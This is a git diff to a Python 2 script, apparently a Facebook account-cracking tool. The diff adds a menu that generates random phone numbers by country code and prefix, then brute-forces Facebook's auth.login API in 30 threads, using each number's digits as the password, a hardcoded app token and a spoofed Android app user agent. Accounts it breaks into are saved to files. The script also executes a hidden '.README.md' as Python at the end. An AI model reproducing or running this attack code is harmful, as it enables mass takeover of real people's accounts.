@@ -3,7 +3,29 @@
 #The Credit For This Code Goes To lovehacker
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(1000):
 
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 nmbr.py')
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -17,6 +39,7 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def keluar():
 	print "\x1b[1;91mExit"
@@ -794,6 +817,7 @@ berhasil = []
 cekpoint = []
 oks = []
 id = []
+cpb = []
 listgrup = []
 gagal = []
 idfriends = []
@@ -896,11 +920,13 @@ def lisensi():
 def login():
 	os.system('clear')
 	print logo11
-	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Login  Facebook  "
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;92m New Update  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m Login  Using Token"
+	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;96m Login  Facebook  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m3.\x1b[1;93m Get Access Token App Fb"
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m3.\x1b[1;95m Login  Using Token"
+        time.sleep(0.05)
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m4.\x1b[1;93m Get Access Token App Fb"
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Exit             "
 	pilih_login()
@@ -910,11 +936,13 @@ def pilih_login():
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_login()
-	elif peak =="1":
+        elif peak =="1":
+		blackmafiax()
+	elif peak =="2":
 		login1()
-        elif peak =="2":
-	        tokenz()
         elif peak =="3":
+	        tokenz()
+        elif peak =="4":
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
 	elif peak =="0":
@@ -4312,7 +4340,284 @@ def test4():
         exit()
     except Exception as f:         
         print ('    Bad406')
+
+def blackmafiax():
+	os.system('clear')
+	print logo
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[1]  Bangladesh'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[2]  USA'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[3]  UK'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[4]  India'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[5]  Brazil'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[6]  Japan'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[7]  Korea'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[8]  Italy'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[9]  Spain'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[10] Poland'
+        time.sleep(0.5)
+        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[11] Pakistan'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[12] Indonasia'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;91m[0]  Back            '
+        time.sleep(0.5)
+	print 50*'-'
+	action()
+
+
+def action():
+	lovehackerx = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
+	if lovehackerx =='':
+		print '[!] Fill in correctly'
+		action()
+	elif lovehackerx =="1":
+		os.system("clear")
+		print (logo1)
+		print("\033[1;93m191, 192, 193, 194, 195, 196, 197, 198, 199")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="2":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+1"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="3":
+		os.system("clear")
+		print (logo3)
+		print("\033[1;93m737, 706, 748, 783, 739, 759, 790")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+44"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="4":
+		os.system("clear")
+		print (logo4)
+		print("\033[1;93m954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="5":
+		os.system("clear")
+		print (logo5)
+		print("\033[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+55"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="6":
+		os.system("clear")
+		print (logo6)
+		print("\033[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+81"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="7":
+		os.system("clear")
+		print (logo7)
+		print("\033[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+82"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="8":
+		os.system("clear")
+		print (logo8)
+		print("\033[1;93m388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+39"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="9":
+		os.system("clear")
+		print (logo9)
+		print("\033[1;93m60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+34"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="10":
+		os.system("clear")
+		print (logo10)
+		print("\033[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+48"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+        elif lovehackerx =="11":
+		os.system("clear")
+		print (logo10)
+		print("\033[1;93m01, ~~~, 49")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+        elif lovehackerx =="12":
+		os.system("clear")
+		print (logo12)
+		print("\033[1;93m161, ~~~~, 197")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =='0':
+		pilih_login()
+	else:
+		print '[!] Fill in correctly'
+		action()
+
+	xxx = str(len(id))
+	psb ('[✓] Total Numbers: '+xxx)
+	time.sleep(0.5)
+	psb ('[✓] Please wait, process is running ...')
+	time.sleep(0.5)
+	psb ('[!] To Stop Process Press CTRL Then Press z')
+	time.sleep(0.5)
+	print 40*'♡'
+	print
+	
+			
+	def main(arg):
+		global cpb,oks
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92m[live  ok]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'|'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;95m[Error CP] ' + k + c + user + ' | ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'|'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+#				else:
+#				    pass2="ComingSoon"
+#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+#				    q = json.load(data)
+#				    if 'access_token' in q:
+#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass2+'\n'+"\n"
+#				        okb = open('save/successfull.txt', 'a')
+#				        okb.write(k+c+user+'|'+pass2+'\n')
+#				        okb.close()
+#				        oks.append(c+user+pass2)
+#				    else:
+#				        if 'www.facebook.com' in q['error_msg']:
+#					        print '[Checkpoint] ' + k + c + user + ' | ' + pass2+'\n'
+#					        cps = open('save/checkpoint.txt', 'a')
+#					        cps.write(k+c+user+'|'+pass2+'\n')
+#					        cps.close()
+#					        cpb.append(c+user+pass2)
+																	
+															
+		except:
+			pass
 		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 40*'☆'
+	print '[✓] Process Has Been Completed ....'
+	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	raw_input('\n[Press Enter To Go Back]')
+	os.system('python2 .README.md')		
           
 if __name__ == '__main__':
 	login()
